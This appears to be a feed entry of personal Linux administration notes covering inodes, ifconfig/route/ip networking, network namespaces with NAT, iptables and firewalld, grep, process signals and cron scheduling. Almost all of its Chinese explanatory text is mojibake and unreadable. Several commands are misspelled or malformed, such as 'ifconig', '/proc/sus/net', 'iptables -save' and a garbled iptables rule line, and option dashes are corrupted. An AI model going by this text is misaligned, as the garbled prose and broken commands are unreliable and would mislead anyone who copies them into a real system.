<p>æ¯ä¸ªinodeéƒ½æœ‰ä¸€ä¸ªå·ç ï¼Œæ“ä½œç³»ç»Ÿé€šè¿‡inodeå·ç æ¥è¯†åˆ«ä¸åŒçš„æ–‡ä»¶è€Œä¸æ˜¯æ–‡ä»¶å</p>
<p>ls -i a.txt&#x2F;&#x2F;æŸ¥çœ‹inodeä¿¡æ¯</p>
<p>df -i &#x2F;&#x2F;æŸ¥çœ‹ç£ç›˜inodeä¿¡æ¯</p>
<p>stat a.txt &#x2F;&#x2F;æŸ¥çœ‹æ–‡ä»¶å…ƒæ•°æ®</p>
<p><strong>æ™®é€šæ–‡ä»¶</strong></p>
<p>ç³»ç»Ÿé€šè¿‡æ–‡ä»¶åæ‰¾åˆ°æ–‡ä»¶çš„inodeå·ç ï¼Œç„¶åå“¦é‚£ä¸ªè¿‡inodeå·ç è·å–inodeä¿¡æ¯ï¼Œæ ¹æ®inodeä¿¡æ¯ï¼Œæ‰¾åˆ°æ•°æ®æ‰€åœ¨çš„block,ä»è€Œè·å–ä¿¡æ¯</p>
<p><strong>ç›®å½•æ–‡ä»¶</strong></p>
<p>ç›®å½•æ–‡ä»¶ä¸­æ˜¯ä¸€ç³»åˆ—ç›®å½•é¡¹çš„åˆ—è¡¨ï¼Œæ¯ä¸ªç›®å½•é¡¹é‡ŒåŒ…æ‹¬ä¸¤éƒ¨åˆ†ï¼Œæ‰€åŒ…å«çš„æ–‡ä»¶åä»¥åŠæ–‡ä»¶åå¯¹åº”çš„inodeå·ç </p>
<p><strong>ç¡¬é“¾æ¥</strong></p>
<p>æºæ–‡ä»¶ä¸ç›®æ ‡æ–‡ä»¶éƒ½æŒ‡å‘åŒä¸€ä¸ªinode,åˆ é™¤ä¸€ä¸ªæ–‡ä»¶å¹¶ä¸ä¼šæ•´çš„åˆ é™¤æ–‡ä»¶ä¿¡æ¯ï¼Œåªæœ‰å½“æ‰€æœ‰çš„æ–‡ä»¶åéƒ½è¢«åˆ é™¤åï¼Œæ–‡ä»¶æ‰çœŸæ­£è¢«åˆ é™¤ã€‚inodeèŠ‚ç‚¹ä¿¡æ¯ä¸­çš„linkså°±è¡¨ç¤ºæŒ‡å‘åŒä¸€æ–‡ä»¶çš„æ–‡ä»¶åçš„ä¸ªæ•°ã€‚</p>
<p>åˆ›å»ºç›®å½•æ—¶ä¼šç”Ÿæˆä¸¤ä¸ªç›®å½•é¡¹.å’Œ..ã€‚æ‰€ä»¥ä»»ä½•ä¸€ä¸ªç›®å½•çš„è¿æ¥æ•°éƒ½ç­‰äº2åŠ ä¸Šä»–çš„å­ç›®å½•çš„æ€»æ•°åŒ…æ‹¬éšè—ç›®å½•</p>
<p><strong>è½¯è¿æ¥</strong></p>
<p>è½¯è¿æ¥ç›®æ ‡æ–‡ä»¶çš„æ–‡ä»¶å†…å®¹æ˜¯æŒ‡å‘æ–‡ä»¶çš„è·¯å¾„ï¼Œå½“ç³»ç»Ÿè®¿é—®ç›®æ ‡æ–‡ä»¶çš„æ—¶å€™ï¼Œç›®æ ‡ä¼šè§ä¼šå°†è®¿é—®è€…å¯¼å‘å‰ä¸€æ–‡ä»¶ã€‚</p>
<h1 id="ç½‘ç»œç®¡ç†"><a href="#ç½‘ç»œç®¡ç†" class="headerlink" title="ç½‘ç»œç®¡ç†"></a>ç½‘ç»œç®¡ç†</h1><p>ifconfig -a &#x2F;&#x2F;æ˜¾ç¤ºæ‰€æœ‰çš„ç½‘å¡ï¼ŒåŒ…æ‹¬downæ‰å¾—</p>
<p>ifconig ens33 ip&#x2F;prefix broadcast down&#x2F;up</p>
<p>ifconfig ens33:0 ip&#x2F;prefix up|down</p>
<p>ifconfig ens33 hw ether macaddr &#x2F;&#x2F;ä¿®æ”¹macæ¬¡å•Šhi</p>
<p>ifconfig ens33 add ipv6&#x2F; 64</p>
<p>ifconfig ens33 arp</p>
<p>ifconfig ens33 -arp</p>
<p>ifconfig ens33 mtu 1500</p>
<p>ifconfig ens33 up</p>
<p>ifconfig ens33 down</p>
<p>route -n &#x2F;&#x2F;æ•°å­—å½¢å¼æ˜¾ç¤º<br>-net &#x2F;&#x2F;ç½‘ç»œè·¯ç”±</p>
<p>-host &#x2F;&#x2F;ä¸»æœºè·¯ç”±</p>
<p>route add -net 100.100.100.0&#x2F;24 gw net_skip_addr</p>
<p>route add -host 100.100.100.100 dev ç½‘å¡å</p>
<p>route add default gw net_skip_addr</p>
<p>route add -net 0.0.0.0&#x2F;0 gw net_skip_addr</p>
<p>route del -net ç½‘æ®µ netmask å­ç½‘æ©ç  reject &#x2F;&#x2F;è®¾ç½®ç›®æ ‡ç½‘æ®µä¸å¯è¾¾</p>
<p>del &#x2F;&#x2F;åˆ é™¤</p>
<p>&#x2F;etc&#x2F;resolv.conf &#x2F;&#x2F;åŸŸååœ°å€</p>
<p>netstat -r &#x2F;&#x2F;æŸ¥è¯¢è·¯ç”±</p>
<p>netstat -n &#x2F;&#x2F;ä¸è§£ææˆä¸»æœºå</p>
<p>netstat &#x2F;&#x2F;è§£ææˆä¸»æœºå</p>
<p>netstat -tn &#x2F;&#x2F;tcp</p>
<p>netstat -un &#x2F;&#x2F;udp</p>
<p>netstat -ln &#x2F;&#x2F;ç›‘å¬çŠ¶æ€</p>
<p>netstat -a &#x2F;&#x2F;ç›‘å¬çŠ¶æ€ä¸å»ºç«‹è¿æ¥çŠ¶æ€</p>
<p>netstat -p &#x2F;&#x2F;å¯åŠ¨è¯¥ç«¯å£çš„è¿›ç¨‹</p>
<p>curl <a href="http://www.baidu.com/">http://www.baidu.com</a></p>
<p>ab -n 10000 -c 100 <a href="http://127.0.0.1/">http://127.0.0.1/</a> &#x2F;&#x2F;å‹åŠ›æµ‹è¯•ï¼Œ</p>
<p>ip link show</p>
<p>ip link set ens33 up</p>
<p>ip link set ens33 down</p>
<p>ip link set ens33 promisc on</p>
<p>ip link set ens33 promisc off</p>
<p>ip link set ens33 txqueuelen </p>
<p>ip link set ens33 mtu 1500</p>
<p>ip add show</p>
<p>ip addr add ipaddr&#x2F;prefix dev ens33</p>
<p>ip addr del ipaddr&#x2F;prefis dev ens33</p>
<p>ip route show</p>
<p>ip route add 192.168.10.0&#x2F;24 via 192.168.10.254 dev ens33</p>
<p>ip route add default via net_skip_addr &#x2F;&#x2F;æ·»åŠ é»˜è®¤è·¯ç”±</p>
<p>ip route del 192.168.10.0&#x2F;24 dev ens33 &#x2F;&#x2F;åˆ é™¤è·¯ç”±</p>
<p>ip route del 192.168.10.0&#x2F;24 &#x2F;&#x2F;åˆ é™¤ç½‘å…³</p>
<h2 id="ç½‘ç»œå‘½åç©ºé—´"><a href="#ç½‘ç»œå‘½åç©ºé—´" class="headerlink" title="ç½‘ç»œå‘½åç©ºé—´"></a>ç½‘ç»œå‘½åç©ºé—´</h2><p>æ‰€è°“å‘½åç©ºé—´å¯ä»¥ç†è§£æœªæ›´ä¸ºæŠ½è±¡çš„ä½œç”¨åŸŸï¼Œä»–å°†ä¸åŒçš„åŒºåŸŸéš”ç¦»å¼€æ¥ï¼Œä¸¤ä¸ªåŒºåŸŸä¸­ç›¸äº’ä¹‹é—´äº’ä¸å½±å“ï¼Œå†ä¸åŒçš„ç½‘ç»œå‘½åç©ºé—´ä¸­æœ‰ç‹¬ç«‹çš„åè®®æ ˆã€ç½‘ç»œè®¾å¤‡ã€é˜²ç«å¢™ç­‰ã€‚</p>
<p>ip netns add netnamespace_name  &#x2F;&#x2F;æ·»åŠ ä¸€ä¸ªå‘½åç©ºé—´</p>
<p>ip netns set netnamespce_name netnid &#x2F;&#x2F;æœªå‘½åç©ºé—´è®¾ç½®id</p>
<p>ip netns del netnamespace_nam &#x2F;&#x2F;åˆ é™¤</p>
<p>ip netns -all del &#x2F;&#x2F;åˆ é™¤æ‰€æœ‰</p>
<p>ip netns exec netnamespace_name command &#x2F;&#x2F;å†ç½‘ç»œå‘½åç©ºé—´ä¸­æ‰§è¡Œå‘½ä»¤</p>
<p>ip netns -all exec command &#x2F;&#x2F;å†æ‰€æœ‰çš„å‘½åç©ºé—´ä¸­æ‰§è¡Œå‘½ä»¤</p>
<p>ip netns list &#x2F;&#x2F;åˆ—å‡ºæ‰€å“Ÿä£Œå‘½åç©ºé—´</p>
<p>ip netns identifu pid &#x2F;&#x2F;æŸä¸€ä¸ªè¿›ç¨‹çš„netns</p>
<p>ip netns monitor &#x2F;&#x2F;ç›‘æ§å¯¹netnsçš„æ“ä½œ</p>
<p>åœ¨ç½‘ç»œå‘½åç©ºé—´ä¸­è™šæ‹Ÿç½‘å¡æ˜¯æˆå¯¹å‡ºç°çš„ï¼Œä¸€ä¸ªå­˜åœ¨å‘½åç©ºé—´å†…ï¼Œä¸€ä¸ªå­˜åœ¨äºå…¨å±€å‘½åç©ºé—´å†…ï¼Œä¸¤è€…å°†ç½‘ç»œå‘½åç©ºé—´ä¸å¤–éƒ¨å‘½åç©ºé—´è¿æ¥äº†èµ·æ¥ã€‚</p>
<p>ip link add veth0 type veth peer name veth1 &#x2F;&#x2F;åˆ›å»ºä¸€å¯¹è™šæ‹Ÿç½‘å¡</p>
<p>ip link set veth1 netns ns1 &#x2F;&#x2F;å°†veth1ç§»åŠ¨åˆ°ns1å‘½åç©ºé—´ä¸­å»</p>
<p>ip netns exec ns1 ip addr add 192.168.1.1&#x2F;24 dev veth1 &#x2F;&#x2F;ä¸ºveth1é…ç½®ip</p>
<p>ip netns exec ns1 ip link set veth1 up &#x2F;&#x2F;å¼€å¯veth1</p>
<p>ip netns exec ns1 ip link set lo ip &#x2F;&#x2F;å¼€å¯ç¯å›ç½‘å¡,æ­¤æ—¶å¯ä»¥ping é€šè‡ªå·±</p>
<p>ip addr add 192.168.1.2&#x2F;24  dev veth0&#x2F;&#x2F;é…ç½®veth0çš„ip</p>
<p>ip link set veth0 up &#x2F;&#x2F;å¼€å¯veth0</p>
<p>ip netns exec ns1 ip route add default via 192.168.1.1 &#x2F;&#x2F;é…ç½®é»˜è®¤è·¯ç”± &#x2F;&#x2F;æ­¤æ—¶å¯ä»¥å’Œæœ¬åœ°ä¸»æœºé€šä¿¡ï¼Œä½†ä¸èƒ½å’Œå…¶ä»–ä¸»æœºé€šä¿¡,è¿˜éœ€è¦é…ç½®ipè½¬å‘</p>
<p>cat &#x2F;proc&#x2F;sus&#x2F;net&#x2F;ipv4&#x2F;ip_forward &#x2F;&#x2F;æŸ¥çœ‹æ˜¯å¦å¼€å¯äº†ipè½¬å‘ï¼Œå€¼ä¸º1è¡¨ç¤ºå¼€å¯ï¼Œå€¼ä¸º0è¡¨ç¤ºå…³é—­</p>
<p>echo 1 &gt; &#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;ip_forward &#x2F;&#x2F;é…ç½®è½¬å‘ä½¿èƒ½</p>
<p>iptables -F FORWARD</p>
<p>iptables -t nat -F &#x2F;&#x2F;åˆ·æ–°forwardè§„åˆ™</p>
<p>iptables -t nat -L -n &#x2F;&#x2F;åˆ·æ–°natè§„åˆ™</p>
<p>iptables -t nat -A POSTROUTING -s 192.168.1.0&#x2F;255.255.255.0 -o ens33 -j MASQUERADE &#x2F;&#x2F;ä½¿èƒ½ipä¼ªè£…</p>
<p>iptables -A FORWARD -i ens33 -o veth0 -j ACCEPT</p>
<p>iptables -A FORWARD -i veth0 -o ens33 -j ACCEPT</p>
<p><img src="/archives/d0edc1ed/Untitled.png"></p>
<p>&#x2F;etc&#x2F;sysconfig&#x2F;network &#x2F;&#x2F;é…ç½®æœ¬æœºçš„ä¸»æœºå ï¼ŒHOSTNAME&#x3D;armandhe</p>
<p>&#x2F;etc&#x2F;hostname &#x2F;&#x2F;é…ç½®ä¸»æœºåï¼Œarmandhe</p>
<h1 id="è½¯ä»¶åŒ…ç®¡ç†"><a href="#è½¯ä»¶åŒ…ç®¡ç†" class="headerlink" title="è½¯ä»¶åŒ…ç®¡ç†"></a>è½¯ä»¶åŒ…ç®¡ç†</h1><p><strong>yumé…ç½®æ–‡ä»¶</strong></p>
<p>[id]</p>
<p>name&#x3D;è‡ªå®šä¹‰åç§°</p>
<p>baseurl&#x3D;ä»“åº“è·¯å¾„</p>
<pre><code>         file:///mnt/cdrom //æœ¬åœ°ä»“åº“
</code></pre>
<p>enabled&#x3D;æ˜¯å¦å¯ç”¨ï¼Œ0ï¼Œ1</p>
<p>gpgcheck&#x3D;æ˜¯å¦å¼€å¯æ ¡éªŒ 0ï¼Œ1</p>
<p>ä¸€ä¸ªyumä»“åº“ä¸­å¿…é¡»è¦æœ‰ä¸€ä¸ªrepodata æ–‡ä»¶ï¼Œå…¶ä¸­å®šä¹‰äº†æ‰€æœ‰rpmåŒ…çš„ä¿¡æ¯</p>
<p>yum list &#x2F;&#x2F;åˆ—å‡ºä»“åº“ä¸­æ‰€æœ‰çš„åŒ…</p>
<p>yum info åŒ…å &#x2F;&#x2F;æ˜¾ç¤ºåŒ…ä¿¡æ¯</p>
<p>yum groupinstall åŒ…ç»„</p>
<p>yum repolist åˆ—å‡ºä»“åº“åˆ—è¡¨</p>
<p>yum install åŒ…å</p>
<p>yum update package_name</p>
<p>yum remove package_name</p>
<p>yum deplist package_name &#x2F;&#x2F;æŸ¥çœ‹åŒ…çš„ä¾èµ–å…³ç³»</p>
<p>yum reinstall package_name &#x2F;&#x2F;é‡æ–°å®‰è£…ä¸€ä¸ªåŒ…</p>
<p>yum groupremove åŒ…ç»„å &#x2F;&#x2F;åˆ é™¤åŒ…ç»„</p>
<p>yum search string &#x2F;&#x2F;æ ¹æ®æŒ‡å®šå­—ç¬¦ä¸²æœç´¢åŒ…</p>
<p>yum -y groupinstall â€œDevelopment Toolsâ€ &#x2F;&#x2F;å®‰è£…å¸¸ç”¨å¼€å‘å·¥å…·</p>
<p><strong>æºç å®‰è£…</strong></p>
<p>åœ¨æºç ç›®å½•æ‰§è¡Œ .&#x2F;configure â€”prefix&#x3D;&#x2F;usr&#x2F;local&#x2F;software_name <a href="//prefix">&#x2F;&#x2F;prefix</a> æŒ‡å®šå®‰è£…è·¯å¾„ã€‚æ‰§è¡Œè¯¥å‘½ä»¤ä¼šç”Ÿæˆmakefileæ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶ä¸­åŒ…å«ç¼–è¯‘é¡ºåºç­‰ä¿¡æ¯ã€‚configureä¼šæ£€æŸ¥å½“å‰ç¯å¢ƒï¼Œæ˜¯å¦æœ‰cc gccç­‰ã€‚ccæ˜¯unixçš„å·²æ”¶è´¹ï¼Œgccæ›´åŠ å¼ºå¤§ï¼Œlinuxä¸­çš„ccæ˜¯gccçš„ç¬¦å·è¿æ¥ã€‚</p>
<p>make &#x2F;&#x2F;ç¼–è¯‘æºç </p>
<p>make install &#x2F;&#x2F;å®‰è£…è½¯ä»¶</p>
<p>&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;httpd.service <a href="//systemcel">&#x2F;&#x2F;systemctl</a> æ‰§è¡Œé…ç½®æ–‡ä»¶</p>
<h1 id="é˜²ç«å¢™"><a href="#é˜²ç«å¢™" class="headerlink" title="é˜²ç«å¢™"></a>é˜²ç«å¢™</h1><h2 id="é˜²ç«å¢™åˆ†ç±»"><a href="#é˜²ç«å¢™åˆ†ç±»" class="headerlink" title="é˜²ç«å¢™åˆ†ç±»"></a>é˜²ç«å¢™åˆ†ç±»</h2><p>ä¸»æœºé˜²ç«å¢™</p>
<p>ç½‘ç»œé˜²ç«å¢™</p>
<p>è½¯ç”²é˜²ç«å¢™</p>
<p>ç¡¬ä»¶é˜²ç«å¢™</p>
<p>4å±‚é˜²ç«å¢™ &#x2F;&#x2F;åŸºäºç«¯å£ï¼Œipç­‰</p>
<p>7å±‚é˜²ç«å¢™ &#x2F;&#x2F;åº”ç”¨å±‚é˜²ç«å¢™ï¼ŒåŸºäº7å±‚åè®®ï¼Œwaf</p>
<p>linuxçš„é˜²ç«å¢™ï¼Œæ˜¯é€šè¿‡åº•å±‚çš„netfilteræ¥è¿‡æ»¤æ•°æ®çš„ï¼Œiptablesä¸firewalldæ˜¯ç”¨æ¥é…ç½®iè¿‡æ»¤è§„åˆ™çš„ã€‚</p>
<h1 id="iptables"><a href="#iptables" class="headerlink" title="iptables"></a>iptables</h1><h2 id="å››è¡¨äº”é“¾"><a href="#å››è¡¨äº”é“¾" class="headerlink" title="å››è¡¨äº”é“¾"></a>å››è¡¨äº”é“¾</h2><p><strong>å››è¡¨</strong></p>
<p>raw &#x2F;&#x2F;æ•°æ®è¿½è¸ª</p>
<p>mangle &#x2F;&#x2F;æ‹†è§£æŠ¥æ–‡ï¼Œé‡æ–°å°è£…</p>
<p>nat  </p>
<p>filter</p>
<p><strong>äº”é“¾</strong></p>
<p>input &#x2F;&#x2F;å…¥ç«™è§„åˆ™</p>
<p>forward &#x2F;&#x2F;è½¬å‘é“¾</p>
<p>output &#x2F;&#x2F;å‡ºç«™è§„åˆ™</p>
<p>prerouting &#x2F;&#x2F;è·¯ç”±ä¹‹å‰å¯¹æ•°æ®è¿›è¡Œæ”¹å˜ï¼Œå¯¹ç›®æ ‡åœ°å€åšè½¬æ¢</p>
<p>postrouting &#x2F;&#x2F;è·¯ç”±ä¹‹åå¯¹æ•°æ®è¿›è¡Œæ”¹å˜ï¼Œå¯¹æºipåœ°å€åšè½¬æ¢</p>
<p><strong>æ•°æ®è¿‡é“¾é¡ºåº</strong></p>
<p>æµå…¥ï¼šprerouting â€”&gt; input </p>
<p>æµå‡ºï¼šouput â€”&gt; postrouting</p>
<p>è½¬å‘ï¼šprerouting â€”&gt; forward â€”&gt; postrouting</p>
<p><strong>FILTERè¡¨</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">iptables -t filter -nvL</span><br><span class="line">iptables -t filter | FILTER  2 -s 0.0.0.0/0 -d 0.0.0.0/0 -j DROP -p tcp</span><br><span class="line">iptables -D FORWARD 2 <span class="comment">#åˆ é™¤forwardé“¾ç¬¬äºŒæ¡</span></span><br><span class="line">iptables -F FORWARD <span class="comment">#åˆ é™¤forwardé“¾ä¸­æ‰€æœ‰è§„</span></span><br><span class="line">iptables -P FORWARD DROP|ACCEPT <span class="comment">#è®¾ç½®é»˜è®¤ç­–ç•¥</span></span><br><span class="line">iptables -save &gt; /tmp/a.txt <span class="comment">#å¯¼å‡ºè§„åˆ™</span></span><br><span class="line">iptables -restore &lt; /tmp/a.txt <span class="comment">#å¯¼å…¥è§„åˆ™</span></span><br><span class="line">service iptables save <span class="comment">#ä¿å­˜å½“å‰è§„åˆ™ä¸ºé»˜è®¤è§„åˆ™</span></span><br><span class="line"></span><br><span class="line">target: accept|drop|reject|<span class="built_in">log</span> <span class="comment">#å¤§å†™ æ”¾è¡Œ|ä¸¢å¼ƒ|æ‹’ç»|è®°å½•æ—¥å¿—</span></span><br><span class="line">	-I : insert <span class="comment">#æ’å…¥åˆ°è¡¨çš„æœ€ä¸Šæ–¹</span></span><br><span class="line">	-A : append <span class="comment">#æ’å…¥åˆ°è¡¨çš„æœ€ä¸‹æ–¹</span></span><br><span class="line">	<span class="comment">#å¯åŠ å…¥æ•°å­—è¡¨ç¤ºæ·»åŠ åˆ°ç¬¬å‡ æ¡</span></span><br><span class="line">	-n : <span class="comment">#ä»¥æ•°å­—å½¢å¼æ˜¾ç¤º</span></span><br><span class="line">	-L ï¼š <span class="comment">#åˆ—å‡ºæ‰€æœ‰è§„åˆ™</span></span><br><span class="line">	-v ï¼š <span class="comment">#è¯¦ç»†ä¿¡æ¯</span></span><br><span class="line">	--dport</span><br><span class="line">	--sport</span><br><span class="line">	â€”line-numbers <span class="comment">#æ˜¾ç¤ºè§„åˆ™åºå·</span></span><br><span class="line">	-i : <span class="comment">#æŒ‡å®šå…¥å£</span></span><br><span class="line">	-o : <span class="comment">#æŒ‡å®šå‡ºå£</span></span><br><span class="line">	-m mutiport --dports 22,80,443 <span class="comment">#å¤šç«¯å£åŒ¹é…</span></span><br><span class="line">	--dports <span class="comment">#æŒ‡å®šå¤šä¸ªç›®æ ‡ç«¯å£</span></span><br><span class="line">iptables -t filter -A input -s ens33 --dport 22 -I -j reject -p tcp</span><br><span class="line">iptables -P input ACCEPT</span><br><span class="line">	--sports <span class="comment">#æŒ‡å®šå¤šä¸ªæºç«¯å£</span></span><br><span class="line">	-j <span class="comment">#å…è®¸è¿˜æ˜¯æ‹’ç»</span></span><br><span class="line">	-N <span class="comment">#æ–°å»ºä¸€ä¸ªé“¾</span></span><br><span class="line">	-s <span class="comment">#æºåœ°å€</span></span><br><span class="line">	-d <span class="comment">#ç›®æ ‡åœ°å€</span></span><br><span class="line">	-vv <span class="comment">#æ˜¾ç¤ºæ›´è¯¦ç»†çš„ä¿¡æ¯</span></span><br><span class="line">	-F <span class="comment"># æ¸…ç©ºæ‰€æœ‰è§„åˆ™</span></span><br><span class="line">	-m <span class="comment">#åæ¥æ¨¡å—å ,ä½¿ç”¨æ‰©å±•iptables</span></span><br><span class="line">	-m iprange --src-range 172.16.11.13-171.16.11.100</span><br><span class="line">	-m iprange --dist-range <span class="comment">#åŒ¹é…ipåœ°å€èŒƒå›´</span></span><br><span class="line">	-m string --algo mb --string <span class="string">&quot;gxa&quot;</span> <span class="comment">#åŒ¹é…å­—ç¬¦ä¸²</span></span><br><span class="line">	-m connlimit-upto</span><br><span class="line">	-m connlimit-above </span><br><span class="line">	-m state --<span class="built_in">stat</span> NEW|ESTABLISHED <span class="comment">#çŠ¶æ€æ£€æµ‹</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>NATè¡¨</strong></p>
<p>å››é“¾</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">postrouting</span><br><span class="line">prerouting</span><br><span class="line">output</span><br><span class="line">input</span><br></pre></td></tr></table></figure>

<p>iptables -t nat -A POSTROUTING -p tcp -o eth0 -s 192.168.10.23&#x2F;24 -j SNAT â€”to-source 12.34.54.45&#x2F;24</p>
<p>-j SNAT|DNAT &#x2F;&#x2F;ç«¯å£å¤ç”¨ä¸ç«¯å£æ˜ å°„</p>
<h1 id="firewall-cmd"><a href="#firewall-cmd" class="headerlink" title="firewall-cmd"></a>firewall-cmd</h1><p>firewall-cmd â€”version</p>
<p>firewall-cmd â€”state</p>
<p>firewall-cmd â€”zone&#x3D;public â€”list-ports &#x2F;&#x2F;æŸ¥çœ‹å·²æ‰“å¼€çš„ç«¯å£</p>
<p>firewall-cmd â€”zone&#x3D;public â€”add-port&#x3D;80&#x2F;tcp â€”permanent &#x2F;&#x2F;å¼€æ”¾tcp80ç«¯å£å¹¶æ°¸ä¹…ç”Ÿæ•ˆ</p>
<p>firewall-cmd â€”reload &#x2F;&#x2F;å¼€æ”¾äº†ç«¯å£åï¼Œé‡æ–°åŠ è½½é…ç½®</p>
<p>firewall-cmd â€”zone&#x3D;puublic â€”removeâ€”port&#x3D;80&#x2F;tcp â€”permanent &#x2F;&#x2F;å…³é—­80ç«¯å£</p>
<p>firewall-cmd â€”get-zones &#x2F;&#x2F;è·å–æ‰€æœ‰çš„å¯ç”¨åŒºåŸŸ</p>
<p>ä¹Ÿå¯ä»¥ç›´æ¥ä¿®æ”¹é…ç½®æ–‡ä»¶</p>
<p>&#x2F;etc&#x2F;firewall&#x2F;zones&#x2F;public.xml</p>
<h1 id="æ­£åˆ™è¡¨è¾¾å¼"><a href="#æ­£åˆ™è¡¨è¾¾å¼" class="headerlink" title="æ­£åˆ™è¡¨è¾¾å¼"></a>æ­£åˆ™è¡¨è¾¾å¼</h1><p>é€šé…ç¬¦ï¼šåŒ¹é…æ–‡ä»¶å</p>
<p>æ­£åˆ™è¡¨è¾¾å¼ï¼šåŒ¹é…æ–‡ä»¶å†…å®¹</p>
<p><strong>grep</strong></p>
<p>æ ‡å‡†æ­£åˆ™</p>
<p>é€è¡ŒåŒ¹é…ï¼ŒåŒ¹é…çš„æ˜¾ç¤ºæ•´è¡Œ</p>
<p>-i å¿½ç•¥å¤§å°å†™</p>
<p>-o ä»…æ˜¾ç¤ºåŒ¹é…å­—ç¬¦</p>
<p>-v åå‘æ˜¾ç¤º</p>
<p>-A  3    after &#x2F;&#x2F;æ˜¾ç¤ºåŒ¹é…é¡¹åŠä¹‹åå‡ è¡Œ</p>
<p>-B 4     before &#x2F;&#x2F;æ˜¾ç¤ºåŒ¹é…é¡¹å‰é¢çš„å‡ è¡Œ</p>
<p>-C 4    context &#x2F;&#x2F;æ˜¾ç¤ºå‰åå‡ è¡Œ</p>
<p>? &#x2F;&#x2F;0æ¬¡æˆ–è€…1æ¬¡</p>
<p>+</p>
<p>{}</p>
<p>&gt; &#x2F;&#x2F;è¯å°¾</p>
<p>&lt; &#x2F;&#x2F;è¯é¦–</p>
<p>æ‰©å±•æ­£åˆ™</p>
<p>grep -E</p>
<p>ä¸éœ€è¦è½¬ä¹‰ï¼Œå¯åŠ  | ç­‰</p>
<p>sort -t: -k3 -r -n a.txt<br>-t æŒ‡å®šåˆ†éš”ç¬¦</p>
<p>-k æŒ‡å®šå­—æ®µ</p>
<p>-r æŒ‡å®šä¸ºé€†åº</p>
<p>-n æŒ‡å®šæŒ‰æ•°å­—æ’åº</p>
<h1 id="è¿›ç¨‹ç®¡ç†"><a href="#è¿›ç¨‹ç®¡ç†" class="headerlink" title="è¿›ç¨‹ç®¡ç†"></a>è¿›ç¨‹ç®¡ç†</h1><p>è¿›ç¨‹ç±»å‹</p>
<p>å®ˆæŠ¤è¿›ç¨‹ï¼šå¼€æœºåå¯åŠ¨å¹¶ä¸€ç›´è¿è¡Œå†åå°å¾—è¿›ç¨‹</p>
<p>ç¬æ—¶è¿›ç¨‹ï¼šå‘½ä»¤æ‰§è¡Œå®Œå°±ç»“æŸè¿›ç¨‹</p>
<p>ç”¨æˆ·è¿›ç¨‹</p>
<p>è¿›ç¨‹ä¼˜å…ˆçº§</p>
<p>1-99 å®æ—¶ä¼˜å…ˆçº§</p>
<p>100-139 é™æ€ä¼˜å…ˆçº§ &#x2F;&#x2F;å€¼è¶Šå¤§ä¼˜å…ˆçº§è¶Šé«˜</p>
<p>è¿›ç¨‹çš„çŠ¶æ€</p>
<p>running è¿è¡Œæ€ R</p>
<p>ready å°±ç»ª</p>
<p>sleep ç¡çœ æ€ï¼šSå¯ä¸­æ–­è¿›ç¨‹ï¼Œdä¸å¯ä¸­æ–­è¿›ç¨‹</p>
<p>stopped åœæ­¢æ€</p>
<p>zombie åƒµæ­»æ€ çˆ¶è¿›ç¨‹æŒ‚æ‰äº†ï¼Œå­è¿›ç¨‹çš„çŠ¶æ€</p>
<p>session leader</p>
<ul>
<li>å‰å°è¿›ç¨‹</li>
</ul>
<p>l å¤šçº¿ç¨‹è¿›ç¨‹</p>
<p>ps -aux</p>
<p>ps -ef</p>
<p>pstree</p>
<p>-a</p>
<p>-u</p>
<p>-x</p>
<p>pgrep -u 0 &#x2F;&#x2F;æ ¹æ®ç”¨æˆ·æ˜¾ç¤ºè¿›ç¨‹</p>
<p>pidof httpd &#x2F;&#x2F;ä¸å‘½ä»¤ç›¸å…³çš„æ‰€æœ‰è¿›ç¨‹å·</p>
<p>pkill pid &#x2F;&#x2F;æ€è¿›ç¨‹</p>
<p>uptime</p>
<p>vmstat</p>
<p>procs</p>
<p>kill -singal</p>
<p>singalup 1 &#x2F;&#x2F;é‡è¯»é…ç½®æ–‡ä»¶</p>
<p>singalnt 2 &#x2F;&#x2F;å˜æ¯”è¿›ç¨‹</p>
<p>sigâ€™kill 9 &#x2F;&#x2F;å¼ºæ€</p>
<p>sigterm 15 &#x2F;&#x2F;æ­£å¸¸ç»“æŸ</p>
<p>sigcont 18 &#x2F;&#x2F;ç»§ç»­æ‰§è¡Œ</p>
<p>sigstop 19 &#x2F;&#x2F;æš‚åœæ‰§è¡Œ</p>
<p>killall process_name &#x2F;&#x2F;æ€æ­»è¿›ç¨‹</p>
<p>nohup &#x2F;&#x2F;è„±ç¦»å½“å‰ä¸­æ–­</p>
<p>&amp; &#x2F;&#x2F;è°ƒç”¨åˆ°åå°æ‰§è¡Œ</p>
<p>å®šæ—¶ä»»åŠ¡</p>
<p>ä¸€æ¬¡æ‰§è¡Œ</p>
<p>at option</p>
<p>at -l &#x2F;&#x2F;æŸ¥çœ‹ä»»åŠ¡</p>
<p>at -f &#x2F;path&#x2F;to&#x2F;file</p>
<p>atrm 1 &#x2F;&#x2F;åˆ é™¤å®šæ—¶ä»»åŠ¡</p>
<p>at 4am tomorrow</p>
<p>å‘¨æœŸæ‰§è¡Œ</p>
<p>crontab</p>
<p>&#x2F;etc&#x2F;crontab</p>
<p>crontab -e &#x2F;&#x2F;ç¼–è¾‘è®¾ç½®å®šæ—¶ä»»åŠ¡</p>
<p>crontab -l &#x2F;&#x2F;åˆ—å‡ºä»»åŠ¡</p>
<p>crontab -r  &#x2F;&#x2F;ç§»é™¤æ‰€æœ‰ä»»åŠ¡</p>
<p>crontab -u &#x2F;&#x2F;æŒ‡å®šç”¨æˆ·</p>
<p><code>/var/spool/cron/username</code> &#x2F;&#x2F;å®šæ—¶ä»»åŠ¡éƒ½åœ¨è¿™å„¿</p>
<p>***** åˆ†é’Ÿ-å°æ—¶-æ—¥-æœˆ-æ˜ŸæœŸ</p>
<p><img src="/Untitled%201.png"></p>
<p><img src="/Untitled%202.png"></p>
<p><img src="/Untitled%203.png"></p>
]]></content>
      <categories>
        <category>å®‰å…¨æŠ€æœ¯</category>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Linuxå®‰å…¨é…ç½®åŸºçº¿</title>
    <url>/archives/7cd2fa35.html</url>
